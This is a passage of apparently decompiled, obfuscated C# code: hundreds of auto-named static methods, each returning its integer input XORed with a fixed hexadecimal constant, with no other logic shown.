	public static int smethod_6878(int int_4)
	{
		return int_4 ^ 0x2A390AD1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6879(int int_4)
	{
		return int_4 ^ 0x71D89696;
	}

	[Obsolete("Exclude")]
	public static int smethod_6880(int int_4)
	{
		return int_4 ^ 0x7BE64EF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6881(int int_4)
	{
		return int_4 ^ 0x62E30759;
	}

	[Obsolete("Exclude")]
	public static int smethod_6882(int int_4)
	{
		return int_4 ^ 0x60E4308E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6883(int int_4)
	{
		return int_4 ^ 0x64F8F981;
	}

	[Obsolete("Exclude")]
	public static int smethod_6886(int int_4)
	{
		return int_4 ^ 0x15715106;
	}

	[Obsolete("Exclude")]
	public static int smethod_6888(int int_4)
	{
		return int_4 ^ 0x21F2B602;
	}

	[Obsolete("Exclude")]
	public static int smethod_6889(int int_4)
	{
		return int_4 ^ 0x2B4F0FF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6890(int int_4)
	{
		return int_4 ^ 0x2CF248FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6891(int int_4)
	{
		return int_4 ^ 0x7FEDD244;
	}

	[Obsolete("Exclude")]
	public static int smethod_6892(int int_4)
	{
		return int_4 ^ 0x781F5BFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6893(int int_4)
	{
		return int_4 ^ 0x523DD9DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6894(int int_4)
	{
		return int_4 ^ 0x1614FC95;
	}

	[Obsolete("Exclude")]
	public static int smethod_6895(int int_4)
	{
		return int_4 ^ 0x17B0A064;
	}

	[Obsolete("Exclude")]
	public static int smethod_6896(int int_4)
	{
		return int_4 ^ 0x5B0F4677;
	}

	[Obsolete("Exclude")]
	public static int smethod_6897(int int_4)
	{
		return int_4 ^ 0x6917F87B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6899(int int_4)
	{
		return int_4 ^ 0x2575AD5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6900(int int_4)
	{
		return int_4 ^ 0x34C3D033;
	}

	[Obsolete("Exclude")]
	public static int smethod_6901(int int_4)
	{
		return int_4 ^ 0x33079D74;
	}

	[Obsolete("Exclude")]
	public static int smethod_6902(int int_4)
	{
		return int_4 ^ 0x4929EABC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6903(int int_4)
	{
		return int_4 ^ 0x49493BFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6904(int int_4)
	{
		return int_4 ^ 0x42EF2A38;
	}

	[Obsolete("Exclude")]
	public static int smethod_6905(int int_4)
	{
		return int_4 ^ 0x72FA9DAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6906(int int_4)
	{
		return int_4 ^ 0x3F0909C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6907(int int_4)
	{
		return int_4 ^ 0x164C70D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6908(int int_4)
	{
		return int_4 ^ 0x2FE21FFE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6909(int int_4)
	{
		return int_4 ^ 0x588A6931;
	}

	[Obsolete("Exclude")]
	public static int smethod_6911(int int_4)
	{
		return int_4 ^ 0x4FD619AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6912(int int_4)
	{
		return int_4 ^ 0x3A048B00;
	}

	[Obsolete("Exclude")]
	public static int smethod_6913(int int_4)
	{
		return int_4 ^ 0x6299BA37;
	}

	[Obsolete("Exclude")]
	public static int smethod_6914(int int_4)
	{
		return int_4 ^ 0xD273AD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6916(int int_4)
	{
		return int_4 ^ 0x7CD15022;
	}

	[Obsolete("Exclude")]
	public static int smethod_6917(int int_4)
	{
		return int_4 ^ 0x4E25F545;
	}

	[Obsolete("Exclude")]
	public static int smethod_6919(int int_4)
	{
		return int_4 ^ 0x1AE001FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6920(int int_4)
	{
		return int_4 ^ 0x21A5A5A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6921(int int_4)
	{
		return int_4 ^ 0x48C19A3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6922(int int_4)
	{
		return int_4 ^ 0x7E993CAE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6923(int int_4)
	{
		return int_4 ^ 0x1CF150C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6924(int int_4)
	{
		return int_4 ^ 0x67F4BB3F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6925(int int_4)
	{
		return int_4 ^ 0x73E71528;
	}

	[Obsolete("Exclude")]
	public static int smethod_6926(int int_4)
	{
		return int_4 ^ 0x32BB9633;
	}

	[Obsolete("Exclude")]
	public static int smethod_6927(int int_4)
	{
		return int_4 ^ 0x33FFA72;
	}

	[Obsolete("Exclude")]
	public static int smethod_6929(int int_4)
	{
		return int_4 ^ 0x5A83C52A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6930(int int_4)
	{
		return int_4 ^ 0x61A02B19;
	}

	[Obsolete("Exclude")]
	public static int smethod_6931(int int_4)
	{
		return int_4 ^ 0x71739252;
	}

	[Obsolete("Exclude")]
	public static int smethod_6932(int int_4)
	{
		return int_4 ^ 0x7E2E8120;
	}

	[Obsolete("Exclude")]
	public static int smethod_6933(int int_4)
	{
		return int_4 ^ 0x2F7EC381;
	}

	[Obsolete("Exclude")]
	public static int smethod_6934(int int_4)
	{
		return int_4 ^ 0x7D031AB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6935(int int_4)
	{
		return int_4 ^ 0x71C0FD9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6936(int int_4)
	{
		return int_4 ^ 0x2F4069DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6937(int int_4)
	{
		return int_4 ^ 0x27A22B8F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6938(int int_4)
	{
		return int_4 ^ 0x5F8C0399;
	}

	[Obsolete("Exclude")]
	public static int smethod_6939(int int_4)
	{
		return int_4 ^ 0x57782DB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6940(int int_4)
	{
		return int_4 ^ 0x545BEC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6942(int int_4)
	{
		return int_4 ^ 0x7474FB2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6943(int int_4)
	{
		return int_4 ^ 0x743E8330;
	}

	[Obsolete("Exclude")]
	public static int smethod_6944(int int_4)
	{
		return int_4 ^ 0x40B3CE51;
	}

	[Obsolete("Exclude")]
	public static int smethod_6945(int int_4)
	{
		return int_4 ^ 0x72C983D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6946(int int_4)
	{
		return int_4 ^ 0x714AB4B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6950(int int_4)
	{
		return int_4 ^ 0x657DD3BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6951(int int_4)
	{
		return int_4 ^ 0x7D9F5EB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6952(int int_4)
	{
		return int_4 ^ 0x6E488EB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6953(int int_4)
	{
		return int_4 ^ 0x7A61F755;
	}

	[Obsolete("Exclude")]
	public static int smethod_6954(int int_4)
	{
		return int_4 ^ 0x1AE6148A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6955(int int_4)
	{
		return int_4 ^ 0x74FD58E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6956(int int_4)
	{
		return int_4 ^ 0x167C373B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6957(int int_4)
	{
		return int_4 ^ 0x134BA638;
	}

	[Obsolete("Exclude")]
	public static int smethod_6958(int int_4)
	{
		return int_4 ^ 0x460E85A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6959(int int_4)
	{
		return int_4 ^ 0x37DB518E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6962(int int_4)
	{
		return int_4 ^ 0x69F8EEFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6963(int int_4)
	{
		return int_4 ^ 0x45A67F97;
	}

	[Obsolete("Exclude")]
	public static int smethod_6965(int int_4)
	{
		return int_4 ^ 0x63D68AE9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6966(int int_4)
	{
		return int_4 ^ 0xD1F3BC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6968(int int_4)
	{
		return int_4 ^ 0x651D0EB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6969(int int_4)
	{
		return int_4 ^ 0x2871888F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6970(int int_4)
	{
		return int_4 ^ 0x390B3A59;
	}

	[Obsolete("Exclude")]
	public static int smethod_6971(int int_4)
	{
		return int_4 ^ 0x5D0CB56E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6972(int int_4)
	{
		return int_4 ^ 0x20B23CA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6973(int int_4)
	{
		return int_4 ^ 0xAB02AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6974(int int_4)
	{
		return int_4 ^ 0x252C2807;
	}

	[Obsolete("Exclude")]
	public static int smethod_6975(int int_4)
	{
		return int_4 ^ 0x5FD7FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6976(int int_4)
	{
		return int_4 ^ 0x7D64F58D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6977(int int_4)
	{
		return int_4 ^ 0x52A03672;
	}

	[Obsolete("Exclude")]
	public static int smethod_6978(int int_4)
	{
		return int_4 ^ 0x43AD4D40;
	}

	[Obsolete("Exclude")]
	public static int smethod_6979(int int_4)
	{
		return int_4 ^ 0x21902DA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6980(int int_4)
	{
		return int_4 ^ 0x26782C55;
	}

	[Obsolete("Exclude")]
	public static int smethod_6982(int int_4)
	{
		return int_4 ^ 0x331104A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6984(int int_4)
	{
		return int_4 ^ 0x3FBEE355;
	}

	[Obsolete("Exclude")]
	public static int smethod_6985(int int_4)
	{
		return int_4 ^ 0x478DB3A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6986(int int_4)
	{
		return int_4 ^ 0x197BBD8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6989(int int_4)
	{
		return int_4 ^ 0x7DC77D8D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6991(int int_4)
	{
		return int_4 ^ 0x1746BDE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6992(int int_4)
	{
		return int_4 ^ 0x555BB56E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6994(int int_4)
	{
		return int_4 ^ 0xBB39241;
	}

	[Obsolete("Exclude")]
	public static int smethod_6995(int int_4)
	{
		return int_4 ^ 0x3ADA14D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6996(int int_4)
	{
		return int_4 ^ 0x580A2102;
	}

	[Obsolete("Exclude")]
	public static int smethod_6997(int int_4)
	{
		return int_4 ^ 0x3A549D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6999(int int_4)
	{
		return int_4 ^ 0x74FC77E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7002(int int_4)
	{
		return int_4 ^ 0x1005F0AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7003(int int_4)
	{
		return int_4 ^ 0x78ED86B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7004(int int_4)
	{
		return int_4 ^ 0x6215EC53;
	}

	[Obsolete("Exclude")]
	public static int smethod_7006(int int_4)
	{
		return int_4 ^ 0x73A1964B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7007(int int_4)
	{
		return int_4 ^ 0x262BA69A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7009(int int_4)
	{
		return int_4 ^ 0x61EC41B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7010(int int_4)
	{
		return int_4 ^ 0x6FB47718;
	}

	[Obsolete("Exclude")]
	public static int smethod_7011(int int_4)
	{
		return int_4 ^ 0x17F21FC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7012(int int_4)
	{
		return int_4 ^ 0x3D01CF97;
	}

	[Obsolete("Exclude")]
	public static int smethod_7013(int int_4)
	{
		return int_4 ^ 0x38E467CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7015(int int_4)
	{
		return int_4 ^ 0x6CB1FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7016(int int_4)
	{
		return int_4 ^ 0x16CBAC3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7018(int int_4)
	{
		return int_4 ^ 0x44007A0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7019(int int_4)
	{
		return int_4 ^ 0x4DFF56A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7020(int int_4)
	{
		return int_4 ^ 0x5D80EC72;
	}

	[Obsolete("Exclude")]
	public static int smethod_7021(int int_4)
	{
		return int_4 ^ 0x42464201;
	}

	[Obsolete("Exclude")]
	public static int smethod_7023(int int_4)
	{
		return int_4 ^ 0x36746F4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7024(int int_4)
	{
		return int_4 ^ 0x7F8F3C7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7025(int int_4)
	{
		return int_4 ^ 0x5E379EBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7026(int int_4)
	{
		return int_4 ^ 0x63BBB3D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7027(int int_4)
	{
		return int_4 ^ 0x5C624646;
	}

	[Obsolete("Exclude")]
	public static int smethod_7028(int int_4)
	{
		return int_4 ^ 0x445AF4C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7029(int int_4)
	{
		return int_4 ^ 0x76B402A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7030(int int_4)
	{
		return int_4 ^ 0x66128C12;
	}

	[Obsolete("Exclude")]
	public static int smethod_7033(int int_4)
	{
		return int_4 ^ 0x34D14248;
	}

	[Obsolete("Exclude")]
	public static int smethod_7035(int int_4)
	{
		return int_4 ^ 0x38027601;
	}

	[Obsolete("Exclude")]
	public static int smethod_7036(int int_4)
	{
		return int_4 ^ 0x56A37A39;
	}

	[Obsolete("Exclude")]
	public static int smethod_7037(int int_4)
	{
		return int_4 ^ 0x73756D30;
	}

	[Obsolete("Exclude")]
	public static int smethod_7038(int int_4)
	{
		return int_4 ^ 0x30933FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7039(int int_4)
	{
		return int_4 ^ 0x39A90E08;
	}

	[Obsolete("Exclude")]
	public static int smethod_7040(int int_4)
	{
		return int_4 ^ 0x28536D7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7041(int int_4)
	{
		return int_4 ^ 0x541C3108;
	}

	[Obsolete("Exclude")]
	public static int smethod_7042(int int_4)
	{
		return int_4 ^ 0x4D8CDF00;
	}

	[Obsolete("Exclude")]
	public static int smethod_7043(int int_4)
	{
		return int_4 ^ 0x7D115F29;
	}

	[Obsolete("Exclude")]
	public static int smethod_7044(int int_4)
	{
		return int_4 ^ 0x6C95621D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7045(int int_4)
	{
		return int_4 ^ 0x19D8982A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7046(int int_4)
	{
		return int_4 ^ 0x54506515;
	}

	[Obsolete("Exclude")]
	public static int smethod_7047(int int_4)
	{
		return int_4 ^ 0x681AB0FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7048(int int_4)
	{
		return int_4 ^ 0x1C5D9853;
	}

	[Obsolete("Exclude")]
	public static int smethod_7050(int int_4)
	{
		return int_4 ^ 0x37A4B19B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7051(int int_4)
	{
		return int_4 ^ 0x6A546472;
	}

	[Obsolete("Exclude")]
	public static int smethod_7052(int int_4)
	{
		return int_4 ^ 0x7A1F63BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7053(int int_4)
	{
		return int_4 ^ 0x6BC213A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7054(int int_4)
	{
		return int_4 ^ 0x691A830E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7055(int int_4)
	{
		return int_4 ^ 0x2DD9CA70;
	}

	[Obsolete("Exclude")]
	public static int smethod_7056(int int_4)
	{
		return int_4 ^ 0x486CF1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7057(int int_4)
	{
		return int_4 ^ 0x339A084B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7058(int int_4)
	{
		return int_4 ^ 0x6EFA40B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7060(int int_4)
	{
		return int_4 ^ 0x7C290D87;
	}

	[Obsolete("Exclude")]
	public static int smethod_7061(int int_4)
	{
		return int_4 ^ 0x5E77ACB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7062(int int_4)
	{
		return int_4 ^ 0x7767F959;
	}

	[Obsolete("Exclude")]
	public static int smethod_7063(int int_4)
	{
		return int_4 ^ 0x588FEC09;
	}

	[Obsolete("Exclude")]
	public static int smethod_7064(int int_4)
	{
		return int_4 ^ 0x221C1E3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7065(int int_4)
	{
		return int_4 ^ 0x4DAEC544;
	}

	[Obsolete("Exclude")]
	public static int smethod_7066(int int_4)
	{
		return int_4 ^ 0x4EBF3069;
	}

	[Obsolete("Exclude")]
	public static int smethod_7067(int int_4)
	{
		return int_4 ^ 0x5107B0B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7068(int int_4)
	{
		return int_4 ^ 0x730CA0B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7069(int int_4)
	{
		return int_4 ^ 0x7DEF340;
	}

	[Obsolete("Exclude")]
	public static int smethod_7070(int int_4)
	{
		return int_4 ^ 0x4A162F98;
	}

	[Obsolete("Exclude")]
	public static int smethod_7071(int int_4)
	{
		return int_4 ^ 0x608E4B18;
	}

	[Obsolete("Exclude")]
	public static int smethod_7072(int int_4)
	{
		return int_4 ^ 0x3E0D9D3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7074(int int_4)
	{
		return int_4 ^ 0x2DC87A35;
	}

	[Obsolete("Exclude")]
	public static int smethod_7075(int int_4)
	{
		return int_4 ^ 0x1F561C7A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7076(int int_4)
	{
		return int_4 ^ 0x56A8CA1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7077(int int_4)
	{
		return int_4 ^ 0x6C0250C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7078(int int_4)
	{
		return int_4 ^ 0x12BD6C1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7079(int int_4)
	{
		return int_4 ^ 0x751CF0F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7081(int int_4)
	{
		return int_4 ^ 0x631F03D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7082(int int_4)
	{
		return int_4 ^ 0x5207F400;
	}

	[Obsolete("Exclude")]
	public static int smethod_7083(int int_4)
	{
		return int_4 ^ 0x7B6771FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_7084(int int_4)
	{
		return int_4 ^ 0x77D18F17;
	}

	[Obsolete("Exclude")]
	public static int smethod_7085(int int_4)
	{
		return int_4 ^ 0x741272A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7086(int int_4)
	{
		return int_4 ^ 0x245BF66E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7087(int int_4)
	{
		return int_4 ^ 0x32714D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7088(int int_4)
	{
		return int_4 ^ 0x4D49B92B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7091(int int_4)
	{
		return int_4 ^ 0x7EEED03D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7093(int int_4)
	{
		return int_4 ^ 0x5E6481C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7094(int int_4)
	{
		return int_4 ^ 0x260FACE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7096(int int_4)
	{
		return int_4 ^ 0x5056B75A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7098(int int_4)
	{
		return int_4 ^ 0x269D8419;
	}

	[Obsolete("Exclude")]
	public static int smethod_7099(int int_4)
	{
		return int_4 ^ 0x5174FF25;
	}

	[Obsolete("Exclude")]
	public static int smethod_7100(int int_4)
	{
		return int_4 ^ 0x6A7125C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7102(int int_4)
	{
		return int_4 ^ 0x79253E10;
	}

	[Obsolete("Exclude")]
	public static int smethod_7103(int int_4)
	{
		return int_4 ^ 0x1BF8046F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7104(int int_4)
	{
		return int_4 ^ 0x6B8DE0ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_7105(int int_4)
	{
		return int_4 ^ 0x70013B5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7106(int int_4)
	{
		return int_4 ^ 0x4DA3C096;
	}

	[Obsolete("Exclude")]
	public static int smethod_7107(int int_4)
	{
		return int_4 ^ 0x4E1E285D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7108(int int_4)
	{
		return int_4 ^ 0x5CA2F5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7109(int int_4)
	{
		return int_4 ^ 0x5BE4E0ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_7110(int int_4)
	{
		return int_4 ^ 0x94FFDFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7111(int int_4)
	{
		return int_4 ^ 0x213A43D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7112(int int_4)
	{
		return int_4 ^ 0x6522CB1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7113(int int_4)
	{
		return int_4 ^ 0x2F513F1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7114(int int_4)
	{
		return int_4 ^ 0x7C3BB347;
	}

	[Obsolete("Exclude")]
	public static int smethod_7115(int int_4)
	{
		return int_4 ^ 0x129FDC3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7116(int int_4)
	{
		return int_4 ^ 0x3D3021F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7117(int int_4)
	{
		return int_4 ^ 0x6649EC34;
	}

	[Obsolete("Exclude")]
	public static int smethod_7118(int int_4)
	{
		return int_4 ^ 0x523D9C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7119(int int_4)
	{
		return int_4 ^ 0x1BF6FD59;
	}

	[Obsolete("Exclude")]
	public static int smethod_7120(int int_4)
	{
		return int_4 ^ 0x4A94F92C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7121(int int_4)
	{
		return int_4 ^ 0x2C064531;
	}

	[Obsolete("Exclude")]
	public static int smethod_7122(int int_4)
	{
		return int_4 ^ 0x1A114445;
	}

	[Obsolete("Exclude")]
	public static int smethod_7123(int int_4)
	{
		return int_4 ^ 0x70FFD24B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7125(int int_4)
	{
		return int_4 ^ 0x2BBCB968;
	}

	[Obsolete("Exclude")]
	public static int smethod_7126(int int_4)
	{
		return int_4 ^ 0x5509D360;
	}

	[Obsolete("Exclude")]
	public static int smethod_7127(int int_4)
	{
		return int_4 ^ 0x25857D4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7129(int int_4)
	{
		return int_4 ^ 0x88122A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7131(int int_4)
	{
		return int_4 ^ 0xBB152D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_7132(int int_4)
	{
		return int_4 ^ 0x69527BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7133(int int_4)
	{
		return int_4 ^ 0x59CA7898;
	}

	[Obsolete("Exclude")]
	public static int smethod_7134(int int_4)
	{
		return int_4 ^ 0x567CD6E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7135(int int_4)
	{
		return int_4 ^ 0x5D6D933B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7136(int int_4)
	{
		return int_4 ^ 0x6F8E7E98;
	}

	[Obsolete("Exclude")]
	public static int smethod_7139(int int_4)
	{
		return int_4 ^ 0x5A50DEE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7142(int int_4)
	{
		return int_4 ^ 0x593B3F43;
	}

	[Obsolete("Exclude")]
	public static int smethod_7143(int int_4)
	{
		return int_4 ^ 0x5E2B6552;
	}

	[Obsolete("Exclude")]
	public static int smethod_7144(int int_4)
	{
		return int_4 ^ 0x88F27FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7145(int int_4)
	{
		return int_4 ^ 0x22D4DEFC;
	}

	[Obsolete("Exclude")]
	public static int smethod_7146(int int_4)
	{
		return int_4 ^ 0x2D85019B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7148(int int_4)
	{
		return int_4 ^ 0x21585460;
	}

	[Obsolete("Exclude")]
	public static int smethod_7149(int int_4)
	{
		return int_4 ^ 0x341BC368;
	}

	[Obsolete("Exclude")]
	public static int smethod_7150(int int_4)
	{
		return int_4 ^ 0x2D8568C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7151(int int_4)
	{
		return int_4 ^ 0x55697153;
	}

	[Obsolete("Exclude")]
	public static int smethod_7152(int int_4)
	{
		return int_4 ^ 0x248520E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7154(int int_4)
	{
		return int_4 ^ 0x5F453F38;
	}

	[Obsolete("Exclude")]
	public static int smethod_7155(int int_4)
	{
		return int_4 ^ 0x710208B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7156(int int_4)
	{
		return int_4 ^ 0x4FAD2861;
	}

	[Obsolete("Exclude")]
	public static int smethod_7157(int int_4)
	{
		return int_4 ^ 0x53F5913;
	}

	[Obsolete("Exclude")]
	public static int smethod_7158(int int_4)
	{
		return int_4 ^ 0x79A3DF7D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7159(int int_4)
	{
		return int_4 ^ 0x2843CA60;
	}

	[Obsolete("Exclude")]
	public static int smethod_7160(int int_4)
	{
		return int_4 ^ 0x39C30E14;
	}

	[Obsolete("Exclude")]
	public static int smethod_7161(int int_4)
	{
		return int_4 ^ 0x1669956D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7163(int int_4)
	{
		return int_4 ^ 0x37587E9D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7164(int int_4)
	{
		return int_4 ^ 0x4BE728AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7165(int int_4)
	{
		return int_4 ^ 0x1AE80368;
	}

	[Obsolete("Exclude")]
	public static int smethod_7166(int int_4)
	{
		return int_4 ^ 0x61536F3F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7167(int int_4)
	{
		return int_4 ^ 0x4DCE46BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7168(int int_4)
	{
		return int_4 ^ 0x33E2125A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7169(int int_4)
	{
		return int_4 ^ 0x3DC2AA74;
	}

	[Obsolete("Exclude")]
	public static int smethod_7170(int int_4)
	{
		return int_4 ^ 0x24D8B88A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7171(int int_4)
	{
		return int_4 ^ 0x2943A1E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7172(int int_4)
	{
		return int_4 ^ 0x61F1F905;
	}

	[Obsolete("Exclude")]
	public static int smethod_7173(int int_4)
	{
		return int_4 ^ 0x3B575A13;
	}

	[Obsolete("Exclude")]
	public static int smethod_7174(int int_4)
	{
		return int_4 ^ 0x3B291B72;
	}

	[Obsolete("Exclude")]
	public static int smethod_7175(int int_4)
	{
		return int_4 ^ 0x388E2615;
	}

	[Obsolete("Exclude")]
	public static int smethod_7176(int int_4)
	{
		return int_4 ^ 0x1829CD80;
	}

	[Obsolete("Exclude")]
	public static int smethod_7177(int int_4)
	{
		return int_4 ^ 0x5E3BD6F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7179(int int_4)
	{
		return int_4 ^ 0x36ECDCB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_7180(int int_4)
	{
		return int_4 ^ 0x59FB5BF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7181(int int_4)
	{
		return int_4 ^ 0x5D88C44A;
	}

	[Obsolete("Exclude")]
	public static int smethod_7182(int int_4)
	{
		return int_4 ^ 0x591FD49F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7183(int int_4)
	{
		return int_4 ^ 0x23DC0E2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7184(int int_4)
	{
		return int_4 ^ 0x7FF7683D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7185(int int_4)
	{
		return int_4 ^ 0x51134160;
	}

	[Obsolete("Exclude")]
	public static int smethod_7186(int int_4)
	{
		return int_4 ^ 0x2AE27AA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7187(int int_4)
	{
		return int_4 ^ 0x786817EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7188(int int_4)
	{
		return int_4 ^ 0x110181E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7189(int int_4)
	{
		return int_4 ^ 0x7AEC6376;
	}

	[Obsolete("Exclude")]
	public static int smethod_7190(int int_4)
	{
		return int_4 ^ 0xBBC241B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7191(int int_4)
	{
		return int_4 ^ 0x58FEB3A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_7192(int int_4)
	{
		return int_4 ^ 0x4C08A72C;
	}

	[Obsolete("Exclude")]
